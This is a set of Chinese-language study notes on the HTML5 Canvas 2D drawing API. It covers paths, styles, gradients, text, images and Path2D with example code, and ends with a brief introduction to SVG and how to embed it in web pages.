    在HTML中添加一个宽600px,高200px的画布,推荐使用CSS来控制宽高
    当不支持画布的浏览器,会显示出标签中的内容.支持的会忽略:
  检测浏览器是否支持画布:检测是否存在getContext方法
    if(canvas.getContext) {  }else {  }
  var cvs = document.querySelector('canvas');  canvas对象
    cvs.toDataURL(type,quality); 返回包含图片的 data URI「需将图片预先放入canvas」
      PS:如果画布的高度或宽度是0,那么会返回字符串“data:,”;
      type     可选,返回的图片类型,默认为 PNG
        图片的分辨率为96dpi;
        若传入非“image/png”,但返回的以“data:image/png”开头,则传入类型是不支持的;
        Chrome支持“image/webp”类型。
      quality  可选,设置得到图片的质量
        在指定图片格式为 image/jpeg 或 image/webp的情况下,
        可以从 0 到 1 的区间内选择图片的质量。
        如果超出取值范围,将会使用默认值 0.92。其他参数会被忽略。
  var ctx =cvs.getContext("2d");   ctx对象:'2d' 上下文
    PS:使用上下文的属性和方法来操作画布,是画布的核心对象
      目前只支持2D绘图,将来可能还会有其他上下文类型
      设置样式等应写在绘制图形之前,否则样式会渲染不上
    画布栅格/坐标空间
      canvas元素默认被网格所覆盖.
      通常来说网格中的一个单元相当于canvas元素中的一像素.
      栅格的起点为左上角,坐标为 0,0 ; 所有元素的位置都相对于原点定位.
      所以图形的坐标为距离左边(Y轴)x像素,距离上边(X轴)y像素,坐标为x,y
    ◆绘制矩形
      PS:不同于SVG,HTML中的元素canvas只支持一种原生的图形绘制：矩形.
        所有其他的图形的绘制都至少需要生成一条路径.
        不同于路径函数pathFunction,这三个函数绘制之后会马上显现在canvas上,即时生效.
      ctx.fillRect(x,y,width,height); 绘制一填充的矩形
        参数为 x,y位置及宽、高尺寸,单位为px
      ctx.strokeRect(x, y, width, height); 绘制一矩形边框
      ctx.clearRect(x, y, width, height); 清除指定矩形区域,让清除部分完全透明
      e.g.:
        var ctx = canvas.getContext('2d');
        ctx.fillRect(25,25,100,100);
        ctx.clearRect(45,45,60,60);
        ctx.strokeRect(50,50,50,50);
    ◆绘制路径
      PS:图形的基本元素是路径
        路径是通过不同颜色和宽度的线段或曲线相连形成的不同形状的点的集合.
        一个路径,甚至一个子路径,都是闭合的.
        当前路径为空,即调用beginPath()之后,或者canvas刚建的时候,
        第一条路径构造命令通常被视为是moveTo(),无论最后的是什么.
        出于这个原因,你几乎总是要在设置路径之后专门指定你的起始位置.
      使用路径绘制图形的步骤
        首先,创建路径起始点
        然后,画图命令画出路径
        之后,封闭路径
        当路径生成,就能通过描边或填充路径区域来渲染图形.
      ★开始/结束路径
      ctx.beginPath(); 开始路径,之后图形绘制命令被指向到路径上生成路径 [无参数]
      ctx.closePath(); 闭合路径,之后图形绘制命令又重新指向到上下文中 [无参数]
        就是闭合路径closePath(),不是必需的.
        这个方法会通过绘制一条从当前点到开始点的直线来闭合图形.
        如果图形是已经闭合了的,即当前点为开始点,该函数什么也不做.
        当你调用fill()函数时,所有没有闭合的形状都会自动闭合,
        所以你不需要调用closePath()函数.
        但是调用stroke()时不会自动闭合.
      ★移动
      ctx.moveTo(x, y); 移动笔触
        PS:该函数实际上并不能画出任何东西.
          当canvas初始化或者beginPath()调用后,你通常会使用moveTo()函数设置起点.
          也能够使用moveTo()绘制一些不连续的路径.
      ★样式
        ◆颜色
          PS:默认情况下,线条和填充颜色都是黑色(CSS 颜色值 #000000)
            一旦设置了strokeStyle或者fillStyle的值,那么该值就会成为新绘制的图形的默认值.
            如果要给每个图形上不同的颜色,需要重新设置 fillStyle 或 strokeStyle 的值.
        ctx.fillStyle    设置图形填充颜色
          可使用颜色名、十六进制或RGB来设置
          e.g. : ctx.fillStyle = "blue"
        ctx.strikeStyle  设置图形轮廓颜色
        TransparencyEDIT 透明度
          ctx.globalAlpha = num  透明度
            PS:除了可以绘制实色图形,我们还可以用 canvas 来绘制半透明的图形.
              通过设置 globalAlpha 属性或者使用一个半透明颜色作为轮廓或填充的样式.
              这个属性影响到 canvas 里所有图形的透明度,
              globalAlpha 属性在需要绘制大量拥有相同透明度的图形时候相当高效.
            num 有效的值范围是 0.0 (完全透明)到 1.0(完全不透明),默认是 1.0.
          使用 strokeStyle 和 fillStyle 属性接受符合 CSS 3 规范的颜色值
            rgba() 方法与 rgb() 方法类似,就多了一个用于设置色彩透明度的参数.
            它的有效范围是从 0.0(完全透明)到 1.0(完全不透明).
            e.g.:
              可以用下面的写法来设置具有透明度的颜色.
              ctx.strokeStyle = "rgba(255,0,0,0.5)";
              ctx.fillStyle = "rgba(255,0,0,0.5)";
        ◆线型
          PS:可以通过一系列属性来设置线的样式
        ctx.lineWidth = value; 设置线条宽度,属性值必须为正数,默认值是 1.0
          线宽是指给定路径的中心到两边的粗细.
          换句话说就是在路径的两边各绘制线宽的一半.
          因为画布的坐标并不和像素直接对应,当需要获得精确的水平或垂直线的时候要特别注意.
        ctx.lineCap = type;    设置线条端点的样式
          butt     默认值
          round    端点处加上了半径为一半线宽的半圆
          square   端点处加上了等宽且高度为一半线宽的方块
        ctx.lineJoin = type;   设定线条与线条间接合处(如折弯的拐角)的样式
          miter  尖叫,默认值
          round  圆角
          bevel  平角
        ctx.miterLimit = value; 限制当两条线相交时交接处最大长度
          所谓交接处长度(斜接长度)是指线条交接处内角顶点到外角顶点的长度
        ctx.setLineDash(segments); 设置当前虚线样式
          接受一个数组,来指定线段与间隙的交替
          e.g.:
            创建一个行军蚁的效果
            var ctx = document.getElementById('canvas').getContext('2d');
            var offset = 0;
            function draw() {
              ctx.clearRect(0,0, canvas.width, canvas.height);
              ctx.setLineDash([4, 2]);
              ctx.lineDashOffset = -offset;
              ctx.strokeRect(10,10, 100, 100);
            }
            function march() {
              offset++;
              if (offset > 16) {
                offset = 0;
              }
              draw();
              setTimeout(march, 20);
            }
            march();
        ctx.getLineDash(); 返回一个包含当前虚线样式,长度为非负偶数的数组
        ctx.lineDashOffset = value; 设置虚线样式的起始偏移量
        ◆渐变
        ctx.createLinearGradient(x1, y1, x2, y2)
          接受 4 个参数,表示渐变的起点 (x1,y1) 与终点 (x2,y2).
        ctx.createRadialGradient(x1, y1, r1, x2, y2, r2)
          接受 6 个参数,前三个定义一个以 (x1,y1) 为原点,半径为 r1 的圆,
          后三个参数则定义另一个以 (x2,y2) 为原点,半径为 r2 的圆.
          e.g.:
            var lineargradient = ctx.createLinearGradient(0,0,150,150);
            var radialgradient = ctx.createRadialGradient(75,75,0,75,75,100);
        gradient.addColorStop(position, color)
          创建出 canvasGradient 对象后,我们就可以用 addColorStop 方法给它上色了.
          接受 2 个参数,position 参数必须是一个 0.0 与 1.0 之间的数值,
          表示渐变中颜色所在的相对位置.例如,0.5 表示颜色会出现在正中间.
          color 参数必须是一个有效的 CSS 颜色值(如 #FFF, rgba(0,0,0,1),等等).
          可以根据需要添加任意多个色标(color stops).
          e.g.:
            线性黑白渐变
              var lineargradient = ctx.createLinearGradient(0,0,150,150);
              lineargradient.addColorStop(0,'white');
              lineargradient.addColorStop(1,'black');
            strokeStyle 和 fillStyle 属性都可以接受 canvasGradient 对象
              var ctx = document.getElementById('canvas').getContext('2d');
              // Create gradients
              var lingrad1 = ctx.createLinearGradient(0,0,0,150);
              lingrad1.addColorStop(0, '#00ABEB');
              lingrad1.addColorStop(0.5, '#fff');
              //lingrad.addColorStop(0.5, '#26C000');
              //lingrad.addColorStop(1, '#fff');
              var lingrad2 = ctx.createLinearGradient(0,50,0,95);
              lingrad2.addColorStop(0.5, '#000');
              lingrad2.addColorStop(1, 'rgba(0,0,0,0)');
              // assign gradients to fill and stroke styles
              ctx.fillStyle = lingrad1;
              ctx.strokeStyle = lingrad2;
              // draw shapes
              ctx.fillRect(10,10,130,130);
              ctx.strokeRect(50,50,50,50);
            径向渐变
              var ctx = document.getElementById('canvas').getContext('2d');
              // 创建渐变
              var radgrad = ctx.createRadialGradient(45,45,10,52,50,30);
              radgrad.addColorStop(0, '#A7D30C');
              radgrad.addColorStop(0.9, '#019F62');
              radgrad.addColorStop(1, 'rgba(1,159,98,0)');
              var radgrad2 = ctx.createRadialGradient(105,105,20,112,120,50);
              radgrad2.addColorStop(0, '#FF5F98');
              radgrad2.addColorStop(0.75, '#FF0188');
              radgrad2.addColorStop(1, 'rgba(255,1,136,0)');
              var radgrad3 = ctx.createRadialGradient(95,15,15,102,20,40);
              radgrad3.addColorStop(0, '#00C9FF');
              radgrad3.addColorStop(0.8, '#00B5E2');
              radgrad3.addColorStop(1, 'rgba(0,201,255,0)');
              var radgrad4 = ctx.createRadialGradient(0,150,50,0,140,90);
              radgrad4.addColorStop(0, '#F4F201');
              radgrad4.addColorStop(0.8, '#E4C700');
              radgrad4.addColorStop(1, 'rgba(228,199,0,0)');
              // 画图形
              ctx.fillStyle = radgrad4;
              ctx.fillRect(0,0,150,150);
              ctx.fillStyle = radgrad3;
              ctx.fillRect(0,0,150,150);
              ctx.fillStyle = radgrad2;
              ctx.fillRect(0,0,150,150);
              ctx.fillStyle = radgrad;
              ctx.fillRect(0,0,150,150);
        ◆图案
        ctx.createPattern(image, type)
          PS:用 canvas 对象作为 Image 参数在 Firefox 1.5 (Gecko 1.8) 中是无效的.
            图案跟渐变类似,创建出一个pattern之后,赋给fillStyle或strokeStyle即可
          Image 可以是一个 Image 对象的引用,或者另一个 canvas 对象.
          Type 必须是下面的字符串值之一：repeat,repeat-x,repeat-y 和 no-repeat.
          e.g.:
            var ctx = document.getElementById('canvas').getContext('2d');
            var img = new Image();
            img.src = 'images/wallpaper.png';
            img.onload = function(){
              // 创建图案
              var ptrn = ctx.createPattern(img,'repeat');
              ctx.fillStyle = ptrn;
              ctx.fillRect(0,0,150,150);
            }
        ◆阴影
          PS:shadowOffsetX,shadowOffsetY 不受变换矩阵所影响.
            负值表示阴影会往上或左延伸,正值则表示会往下或右延伸,它们默认都为 0.
        shadowOffsetX = float 用来设定阴影在X轴的延伸距离
        shadowOffsetY = float 用来设定阴影在Y轴的延伸距离
        shadowBlur = float 用于设定阴影的模糊程度
          其数值并不跟像素数量挂钩,也不受变换矩阵的影响,默认为 0.
        shadowColor = color 用于设定阴影颜色效果
          shadowColor 是标准的 CSS 颜色值,默认是全透明的黑色.
        e.g.:
          文字阴影
            var ctx = document.getElementById('canvas').getContext('2d');
            ctx.shadowOffsetX = 2;
            ctx.shadowOffsetY = 2;
            ctx.shadowBlur = 2;
            ctx.shadowColor = "rgba(0, 0, 0, 0.5)";
            ctx.font = "20px Times New Roman";
            ctx.fillStyle = "Black";
            ctx.fillText("Sample String", 5, 30);
      ★线
      ctx.lineTo(x, y); 绘制一条从当前位置到指定x以及y位置的直线;
        该方法有两个参数：x以及y ,代表坐标系中直线结束的点.
        开始点和之前的绘制路径有关,之前路径的结束点就是接下来的开始点,
        开始点也可以通过moveTo()函数改变.
      ★矩形
      ctx.rect(x,y,width,height); 将一个矩形路径增加到当前路径上
        绘制一个左上角坐标为(x,y),宽高为width以及height的矩形.
        当该方法执行的时候,moveTo()方法自动设置坐标参数(0,0) .
        也就是说,当前笔触自动重置会默认坐标. ?
      ★圆弧
      ctx.arc(x,y,radius,startAngle,endAngle,anticlockwise); 绘制圆弧
        画一个以 x,y 为圆心的以radius为半径的圆弧,从startAngle开始到endAngle结束,
        按照anticlockwise给定的方向[默认为顺时针]来生成.
         x,y为绘制圆弧所在圆上的圆心坐标.
         radius为半径.
         startAngle以及endAngle参数用弧度定义了开始以及结束的弧度.
           角度与弧度的js表达式:radians=(Math.PI/180)*degrees.
         这些都是以x轴为基准.
         参数anticlockwise 为一个布尔值.为true时,是逆时针方向,否则顺时针方向.
      ctx.arcTo(x1,y1,x2,y2,radius);
        根据给定的控制点和半径画一段圆弧,再以直线连接两个控制点.
      ★贝塞尔bezier以及二次贝塞尔
        一次以及二次贝塞尔曲线都十分有用,一般用来绘制复杂有规律的图形.
        e.g.:
          使用贝赛尔曲线绘制对话气泡
            var ctx = canvas.getContext('2d');
            ctx.beginPath();
            ctx.moveTo(75,25);
            ctx.quadraticCurveTo(25,25,25,62.5);
            ctx.quadraticCurveTo(25,100,50,100);
            ctx.quadraticCurveTo(50,120,30,125);
            ctx.quadraticCurveTo(60,120,65,100);
            ctx.quadraticCurveTo(125,100,125,62.5);
            ctx.quadraticCurveTo(125,25,75,25);
            ctx.stroke();
          使用贝赛尔曲线绘制心形
            var ctx = canvas.getContext('2d');
            ctx.beginPath();
            ctx.moveTo(75,40);
            ctx.bezierCurveTo(75,37,70,25,50,25);
            ctx.bezierCurveTo(20,25,20,62.5,20,62.5);
            ctx.bezierCurveTo(20,80,40,102,75,120);
            ctx.bezierCurveTo(110,102,130,80,130,62.5);
            ctx.bezierCurveTo(130,62.5,130,25,100,25);
            ctx.bezierCurveTo(85,25,75,37,75,40);
            ctx.fill();
      ctx.quadraticCurveTo(cp1x, cp1y, x, y) 绘制贝塞尔曲线
          cp1x,cp1y为控制点坐标,x,y为结束点坐标
      ctx.bezierCurveTo(cp1x, cp1y, cp2x, cp2y, x, y) 绘制二次贝塞尔曲线
          cp1x,cp1y为控制点一坐标,cp2x,cp2y为控制点二坐标,x,y为结束点坐标
      ★渲染路径
      ctx.stroke();    通过线条来绘制图形轮廓  [无参数]
      ctx.fill();      通过填充路径的内容区域生成实心的图形
        PS:当我们用到 fill(或者 clip和isPointinPath )你可以选择一个填充规则,
          该填充规则根据某处在路径的外面或者里面来决定该处是否被填充,
          这对于自己与自己路径相交或者路径被嵌套的时候是有用的.
        两个可能的值：
           "nonzero"    non-zero winding rule, 默认值.
           "evenodd"    even-odd winding rule.
        e.g.:
          var ctx = document.getElementById('canvas').getContext('2d');
          ctx.beginPath();
          ctx.arc(50, 50, 30, 0, Math.PI*2, true);
          ctx.arc(50, 50, 15, 0, Math.PI*2, true);
          ctx.fill("evenodd");
    ◆绘制文本
      ctx.fillText(text, x, y [, maxWidth]); 在指定的(x,y)位置填充指定的文本
        绘制的最大宽度是可选的
      ctx.strokeText(text, x, y [, maxWidth]); 在指定的(x,y)位置绘制文本边框
        绘制的最大宽度是可选的
      e.g.:
        var ctx = document.getElementById('canvas').getContext('2d');
        ctx.font = "48px serif";
        ctx.fillText("Hello world", 10, 50);

        文本用当前的边框样式被绘制：
        var ctx = document.getElementById('canvas').getContext('2d');
        ctx.font = "48px serif";
        ctx.strokeText("Hello world", 10, 50);
      ★文本样式
      ctx.font = value  当前我们用来绘制文本的样式.
        和 CSS font 属性相同的语法. 默认的字体是 '10px sans-serif'
      ctx.textAlign = value 文本对齐选项.
        可选的值包括：start, end, left, right or center. 默认值是 start.
      ctx.textBaseline = value 基线对齐选项
        可选的值包括：top, hanging, middle, alphabetic, ideographic, bottom.
        默认值是 alphabetic.
      ctx.direction = value 文本方向.
        可能的值包括：ltr, rtl, inherit.默认值是 inherit.
      e.g.:
        ctx.font = "48px serif";
        ctx.textBaseline = "hanging";
        ctx.strokeText("Hello world", 0, 100);
      ctx.measureText() 文本测量
        将返回一个 TextMetrics对象的宽度、所在像素,这些体现文本特性的属性.
        e.g.:
          var ctx = document.getElementById('canvas').getContext('2d');
          var text = ctx.measureText("foo"); // TextMetrics object
          text.width; // 16;
    ◆绘制图像
      PS: 可以用于动态的图像合成或者作为图形的背景,以及游戏界面(Sprites)等等.
        浏览器支持的任意格式的外部图片都可以使用,比如PNG、GIF或者JPEG.
        你甚至可以将同一个页面中其他canvas元素生成的图片作为图片源.
      引入图像到canvas里需要以下两步基本操作：
        获得一个指向HTMLImageElement的对象或者另一个canvas元素的引用作为源,
          也可以通过提供一个URL的方式来使用图片
        使用 drawImage() 函数将图片绘制到画布上
      获得需要绘制的图片
        canvas的API可以使用下面这些类型中的一种作为图片的源：
          HTMLImageElement 这些图片是由Image()函数构造出来的,或者任何的<img>元素
          HTMLVideoElement 用一个HTML的 <video>元素作为你的图片源,
            可以从视频中抓取当前帧作为一个图像
          HTMLCanvasElement 可以使用另一个 <canvas> 元素作为你的图片源.
          ImageBitmap  它可以从上述的所有源以及其它几种源中生成.
            这是一个高性能的位图,可以低延迟地绘制,
          这些源统一由 CanvasImageSource类型来引用.
        使用相同页面内的图片
          我们可以通过下列方法的一种来获得与canvas相同页面内的图片的引用：
          document.images集合
          document.getElementById() 等方法
        使用其它域名下的图片
          在 HTMLImageElement上使用crossOrigin属性,你可以请求加载其它域名上的图片.
          如果图片的服务器允许跨域访问这个图片,那么你可以使用这个图片而不污染canvas,
          否则,使用这个图片将会污染canvas.
        使用其它 canvas 元素
          和引用页面内的图片类似地,用 document.getElementsByTagName 或
          document.getElementById 方法来获取其它 canvas 元素.
          但你引入的应该是已经准备好的 canvas.
          一个常用的应用就是将第二个canvas作为另一个大的 canvas 的缩略图.
        由零开始创建图像
          或者我们可以用脚本创建一个新的 HTMLImageElement 对象.
          要实现这个方法,我们可以使用很方便的Image()构造函数.
            var img = new Image();   // 创建一个<img>元素
            img.src = 'myImage.png'; // 设置图片源地址
            当脚本执行后,图片开始装载.
            若调用 drawImage 时,图片没装载完,那什么都不会发生,
            (在一些旧的浏览器中可能会抛出异常).
            因此你应该用load时间来保证不会在加载完毕之前使用这个图片：
            var img = new Image();   // 创建img元素
            img.onload = function(){
              // 执行drawImage语句
            }
            img.src = 'myImage.png'; // 设置图片源地址
            如果你只用到一张图片的话,这已经够了.
            但一旦需要不止一张图片,那就需要更加复杂的处理方法,
            但图片预装载策略超出本教程的范围,感兴趣的话可以参考JavaScript Image Preloader.
        通过 data: url 方式嵌入图像
          我们还可以通过 data:url 方式来引用图像.
          Data urls 允许用一串 Base64 编码的字符串的方式来定义一个图片.
          e.g.:
            img.src = 'data:image/gif;base64,R0lGODlhCwALAIAAAAAA3pn/ZiH5BAEAAAEALAAAAAALAAsAAAIUhA+hkcuO4lmNVindo7qyrIXiGBYAOw==';
            其优点就是图片内容即时可用,无须再到服务器兜一圈.
            (还有一个优点是,可以将 CSS,JavaScript,HTML 和 图片全部封装在一起,迁移起来十分方便.)
            缺点就是图像没法缓存,图片大的话内嵌的 url 数据会相当的长：
        使用视频帧
          你还可以使用<video> 中的视频帧(即便视频是不可见的).
          e.g.:
            例如,如果你有一个ID为“myvideo”的<video> 元素,你可以这样做：
            var canvas = document.getElementById('canvas');
            if (canvas.getContext) {
              var ctx = canvas.getContext('2d');
              return document.getElementById('myvideo');
            }
            它将为这个视频返回HTMLVideoElement对象,正如我们前面提到的,它可以作为我们的Canvas图片源.
      绘制图片
        一旦获得了源图对象,我们就可以使用 drawImage 方法将它渲染到 canvas 里.
        ctx.drawImage(image, x, y)
          其中 image 是 image 或者 canvas 对象,
          x 和 y 是其在目标 canvas 里的起始坐标.
          SVG图像必须在 <svg> 根指定元素的宽度和高度.
          e.g.:
            var ctx = document.getElementById('canvas').getContext('2d');
            var img = new Image();
            img.src = 'images/backdrop.png';
            img.onload = function(){
              ctx.drawImage(img,0,0);
              ctx.beginPath();
              ctx.moveTo(30,96);
              ctx.lineTo(70,66);
              ctx.lineTo(103,76);
              ctx.lineTo(170,15);
              ctx.stroke();
            }
        ctx.drawImage(image,x,y,width,height) 增加缩放
          PS:注意：图像可能会因为大幅度的缩放而变得起杂点或者模糊.
            如果您的图像里面有文字,那么最好还是不要进行缩放,
            因为那样处理之后很可能图像里的文字就会变得无法辨认了.
          drawImage 方法的又一变种是增加了两个用于控制图像在 canvas 中缩放的参数.
          这个方法多了2个参数：width 和 height,
          这两个参数用来控制 当像canvas画入时应该缩放的大小
          e.g.:
            图像大小被缩放至 50*38 px
            var ctx = document.getElementById('canvas').getContext('2d');
            var img = new Image();
            img.src = 'https://mdn.mozillademos.org/files/5397/rhino.jpg';
            img.onload = function(){
              ctx.drawImage(img,50,38,50,38);
            };
        drawImage(image,sx,sy,sWidth,sHeight,dx,dy,dWidth,dHeight) 增加切片
          PS:切片是个做图像合成的强大工具.
            假设有一张包含了所有元素的图像,那么你可以用这个方法来合成一个完整图像.
            drawImage 方法的第三个也是最后一个变种有8个新参数,用于控制做切片显示的.
          第一个参数和其它的是相同的,都是一个图像或者另一个 canvas 的引用.
          前4个是定义图像源的切片位置和大小,后4个则是定义切片后目标显示位置和大小.
          e.g.:
            相册
              24-bit PNG 图像带有一个完整的 8-bit alpha 通道,与 GIF 和 8-bit PNG 不同,
              可以将它放成背景而不必担心底色的问题.
              var canvas = document.getElementById('canvas');
              var ctx = canvas.getContext('2d');
              // Draw slice
              ctx.drawImage(document.getElementById('source'),
                            33,71,104,124,21,20,87,104);
              // Draw frame
              ctx.drawImage(document.getElementById('frame'),0,0);
            画廊
              for (i=0;i<document.images.length;i++){
                // Don't add a canvas for the frame image
                if (document.images[i].getAttribute('id')!='frame'){
                  // Create canvas element
                  canvas = document.createElement('CANVAS');
                  canvas.setAttribute('width',132);
                  canvas.setAttribute('height',150);
                  // Insert before the image
                  document.images[i].parentNode.insertBefore(canvas,document.images[i]);
                  ctx = canvas.getContext('2d');
                  // Draw image to canvas
                  ctx.drawImage(document.images[i],15,20);
                  // Add frame
                  ctx.drawImage(document.getElementById('frame'),0,0);
                }
              }
    Path2D 对象 用来缓存或记录绘画命令,这样就能快速地回顾路径
      PS:为了简化代码和提高性能,Path2D对象已可以在较新版本的浏览器中使用
        所有的路径方法比如 moveTo, rect, arc 或 quadraticCurveTo等,都可以在Path2D中使用
      ★创建 Path2D
        Path2D()会返回一个新初始化的Path2D对象,
        可能将某一个路径作为变量——创建一个它的副本,
        或者将一个包含SVG path数据的字符串作为变量.
      var pathd = new Path2D();     // 空的Path对象
      var pathd = new Path2D(path); // 克隆Path对象
      var pathd = new Path2D(d);    // 从SVG建立Path对象
      pathd.addPath(path [, transform])​
        Path2D API 添加了 addPath作为将path结合起来的方法.
        当你想要从几个元素中来创建对象时,这将会很实用.比如：
        添加了一条路径到当前路径(可能添加了一个变换矩阵).
      e.g.:
        在这个例子中,我们创造了一个矩形和一个圆.
        它们都被存为Path2D对象,后面再派上用场.
        随着新的Path2D API产生,几种方法也相应地被更新来使用Path2D对象而不是当前路径.
        在这里,带路径参数的stroke和fill可以把对象画在画布上.
        var ctx = canvas.getContext('2d');
        var rectangle = new Path2D();
        rectangle.rect(10, 10, 50, 50);
        var circle = new Path2D();
        circle.moveTo(125, 35);
        circle.arc(100, 35, 25, 0, 2 * Math.PI);
        ctx.stroke(rectangle);
        ctx.fill(circle);
      使用 SVG paths
        新的Path2D API有另一个强大的特点,就是使用SVG path data来初始化canvas上的路径.
        这将使你获取路径时可以以SVG或canvas的方式来重用它们.
        e.g.:
          这条路径将先移动到点 (M10 10) 然后再水平移动80个单位 (h 80),
          然后下移80个单位 (v 80),接着左移80个单位 (h -80),再回到起点处 (z).
          var p = new Path2D("M10 10 h 80 v 80 h -80 Z");
    ◆边框
      ctx.strokeText(str,x,y,maxwidth); 边框文字
    ◆文字绘制
      ctx.font        取/设字体
        使用和css中相同格式
        e.g. :
        ctx.font = "italic bold 1.5em Times,serif"
      ctx.fillText(str,x,y,maxwidth); 填充文字
        str      为需要显示的字符串
        x,y      绘制的起点坐标
          以文字的左下角为参考,当x,y都为0时在画布中看不到文字
        maxwidth 文本的最大宽度,可选参数
          当字符串过多导致宽度超过maxwidth,会响应的缩放以适应.
      ctx.textAlign   置文字水平对齐方式
        PS:在从左到右的语言中,start和end 与 left和right含义相同,比如英语
          但在从右到左的语言(如希伯来语)中,则正好相反
        可设置的值为:start、end、left、right和center
        e.g. :
        ctx.textAlign ="left"
      ctx.textBaseline 基线,取/设字体的垂直对齐方式
        bottom
        middle
        alphabetic  (默认值)
        ideographic
        hanging
        top
        e.g. :
        ctx.textBaseline = "middle"
    ◆
      ctx.globalCompositeOperation  取/设显示层次
        PS:在新图像产生前进行定义
        source-over 默认,新图像在原内容上显示,产生覆盖效果
        source-in   新图形会仅仅出现与原有内容重叠的部分.其它都变成透明
        source-atop 新图形中与原有内容重叠的部分会被绘制,并覆盖于原有内容之上.
        source-out  只有新图形中与原有内容不重叠的部分会被绘制出来
        destination-over 会在原有内容之上绘制新图形
        destination-atop 原有内容中与新内容重叠的部分会被保留,并会在原有内容之下绘制新图形
        destination-in  原有内容中与新图形重叠的部分会被保留,其它区域都变成透明的.
        destination-out 原有内容中与新图形不重叠的部分会被保留.
        lighter 两图形中重叠部分作加色处理.
        copy   只有新图形会被保留,其它都被清除掉
        xor    重叠的部分会变成透明.
        darker 两图形中重叠的部分作减色处理
        e.g. :
        ctx.globalCompositeOperation ="source-over"
    ◆路径相关: 在描出路径之前,路径是不可见的
      在绘制多个图形时,应该在绘制一个图形之前开绘制路径,
      定制完成后关闭绘制路径并绘制定制好的图形.

      ctx.lineWidth    设置直线的宽度
      ctx.lineCap  设置线的端点样式
        butt   默认,边缘是平的,与当前线条垂直
        round  边缘是半圆,该半圆的直径是当前线条的长度;
        square 边缘是长方形,该长方形的长是当前线条的宽度,宽是当前线条宽度的一半;
      ctx.lineTo(x,y); 从当前位置画直线到
        参数x,y为数值,表示x,y的坐标
      ctx.arc(x,y,radius,startAngle,endAngle,direction); 绘制圆形路径
        x,y为坐标  指定圆心位置
        radius     圆半径
        startAngle 起始角度,起始点与圆心的连线和x轴正方向间的角度
          角度单位为弧度
          x轴正方向为水平向右
          角度可为负即逆时针旋转的角度.
        endAngle   终点角度,
        direction  逆/顺时针旋转.true为逆时针,false为顺时针.
      ctx.closePath(); 闭合路径
    ◆图片绘制
      e.g.:
      var ctx = document.getElementById("mycanvas").getContext("2d");
      var img=document.getElementById("myImg");
      ctx.beginPath();
      ctx.drawImage(img,x,y);
      ctx.closePath();
      ctx.drawImage(图片/画布/视频(元素)对象,x,y,width,height); 放置图片
        三参数：1 需要绘制的图片对象, 2 3 图片坐标；
        五个参数：1 需要绘制的图片对象, 2 3 图片坐标, 4 5 图片宽高；
        九个参数：1 需要绘制的图片对象, 2 3 绘制图片的横纵向切割点,
          4 5 切割宽度, 6 7 切割好的图片坐标, 8 9 切割好的图片宽高
        关于第一个参数
          得到图片对象的方法:
            可通过DOM获取 document.getElementById()
            创建一个image对象 var img =new Image();img.src="XX"
          为视频元素时,可将视频画面放在画布中
        Remarks:
          图片并不总会立即加载,所以在加入图片之前要确保图片已经完全加载,一般如下处理
            图片对象.onload =function(){
              context.drawImage(图片对象,x,y,width,height);
            }
      ctx.getImageData(x,y,width,height); 获取图片
      ctx.putImageData
      ctx.save();    保存状态
        保存之前context的状态,如fillStyle、strokeStyle、lineWidth等
      ctx.restore(); 恢复之前保存的状态
      ctx.translate(x,y);   画布平移
        e.g. :
        context.translate(20,50)
        分别向x,y方向移动20,50(单位为像素)
      ctx.rotate(弧度值);   画布旋转
    ◆绘制阴影
      ctx.shadowOffsetX=num; 横向偏移量
      ctx.shadowOffsetY=num; 纵向偏移量
      ctx.shadowColor   阴影颜色
      ctx.shadowBlur=num; 模糊等级
    ◆绘制渐变
      e.g.:
      ctx.beginPath();
      var color=ctx.createLinearGradient(500,500,500,0);
      color.addcolorStop(0.3,"orange");
      color.addcolorStop(0.5,"yellow");
      color.addcolorStop(1,"gray");
      ctx.fillStyle=color;
      ctx.fillRect(0,0,1200,500);
      ctx.closePath();
      var color=ctx.createLinearGradient(x1,y1,x2,y2); 定义线性渐变
        x1,y1  渐变开始的坐标
        x2,y2  渐变结束的坐标
      var color=ctx.createLinearGradient(x1,y1,x2,y2); 定义圆形渐变
      color.addColorStop(小数值,颜色);  添加渐变色
        e.g.:
        color.addColorStop(0.3,"orange");
        color.addColorStop(0.5,"yellow");
    e.g.
      使用 translate rotate save restore 绘制图案
        <canvas id="canvas" width="400" height="400"></canvas>

        var canvas =document.getElementById("canvas");
        var context =canvas.getContext("2d");
        var degrees =36;
        context.save();
        // 保存上下文状态,以便在工作完成之后能恢复到正常位置
        context.translate(200,200);
        context.fillStyle ="rgba(50,50,50,0.5)";
        for(var i=0; i<360/degrees;i++){
          context.fillRect(0,0,100,100);
          context.rotate(degrees*Math.PI/180);
        }
        context.restore();
SVG,Scalable_Vector_Graphics    可缩放矢量图 
  PS:一种描述向量图形的XML格式的标记化语言。
    也就是说,SVG本质上是文本文件,格式采用XML,可以在浏览器中显示出矢量图像。
    由于结构是XML格式,使得它可以插入HTML文档,成为DOM的一部分,
    然后用JavaScript和CSS进行操作。
    相比传统的图像文件格式(比如JPG和PNG),SVG图像的优势就是文件体积小,
    并且放大多少倍都不会失真,因此非常合适用于网页。
    SVG图像可以用专门的图像软件生成。
    目前,所有主流浏览器都支持,
    对于低于IE 9 的浏览器,可以使用第三方的polyfills函数库。
  SVG插入网页的方法
    直接把SVG代码写在HTML网页里面。
      <svg id="mysvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid meet" >
        <circle id="mycircle" cx="400" cy="300" r="50" />
      <svg>
    SVG代码也可以写在一个独立文件中,
      然后用在<img>、<object>、<embed>、<iframe>等标签,
      以及CSS的background-image属性,将这个文件插入网页。
      <!-- 方法一 -->
      <img src="circle.svg">
      <!-- 方法二 -->
      <object id="object" data="circle.svg" type="image/svg+xml"></object>
      <!-- 方法三 -->
      <embed id="embed" src="icon.svg" type="image/svg+xml">
      <!-- 方法四 -->
      <iframe id="iframe" src="icon.svg"></iframe>
      上面是四种在网页中插入SVG图像的方式。
    SVG文件还可以插入其他DOM元素
      e.g.:在<div>元素中插入svg
      <div id="stage"></div>
      <script>
      $('#stage').load('icon.svg', function (response) {
        $(this).addClass('svgLoaded');
        if (!response) { /* 加载失败的处理代码 */ }
      });
      </script>
  SVG文件采用XML格式,就是普通的文本文件。
    下面是一个例子。
      <svg width="300" height="180">
        <circle cx="30"  cy="50" r="25" />
        <circle cx="90"  cy="50" r="25" class="red" />
        <circle cx="150" cy="50" r="25" class="fancy" />
      </svg>
      上面的代码定义了三个圆,cx、cy、r属性分别为x坐标、y坐标和半径。
      利用class属性,可以为这些圆指定样式。
      .red { fill: red; /* not background-color! */ }
